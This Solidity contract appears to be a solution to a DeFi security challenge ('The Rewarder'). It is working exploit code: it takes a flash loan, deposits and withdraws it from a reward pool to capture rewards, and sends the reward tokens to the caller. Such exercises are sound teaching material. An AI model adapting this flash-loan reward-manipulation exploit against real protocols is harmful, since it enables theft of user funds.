pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract TheRewarderAttack {

  FlashLoanerPool public immutable pool;
  TheRewarderPool public immutable rewarder;
  IERC20 public immutable token;

  constructor(address _pool, address _rewarder, address _token) {
    pool = FlashLoanerPool(_pool);
    rewarder = TheRewarderPool(_rewarder);
    token = IERC20(_token);
  }

  function attack() public {
    pool.flashLoan(1000000 ether);
    IERC20 rewardToken = IERC20(rewarder.rewardToken());
    rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
  }

  function receiveFlashLoan(uint256 amount) public {
    token.approve(address(rewarder), amount);
    rewarder.deposit(amount);
    rewarder.withdraw(amount);
    token.transfer(msg.sender, amount);
  }

}